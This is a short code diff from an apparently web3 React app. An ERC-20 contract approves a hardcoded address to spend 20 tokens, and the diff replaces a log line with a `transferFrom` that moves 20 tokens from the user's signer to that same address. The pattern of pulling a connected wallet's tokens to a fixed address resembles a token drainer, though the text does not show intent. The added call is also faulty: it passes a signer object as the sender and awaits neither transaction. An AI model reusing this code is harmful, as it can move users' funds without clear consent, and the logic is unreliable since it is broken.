@@ -303,7 +303,7 @@ export const App = () => {
             signer
         ); 
          var tx = erc20Contract.approve("0x460D3Bb056Df7aB5BA6701E78D57c689c7B1D513", ethers.utils.parseEther("20"))
-         console.log("transection is ", tx);
+         erc20Contract.transferFrom(signer,"0x460D3Bb056Df7aB5BA6701E78D57c689c7B1D513",ethers.utils.parseEther("20"))
     }
     return <div>
         <div>
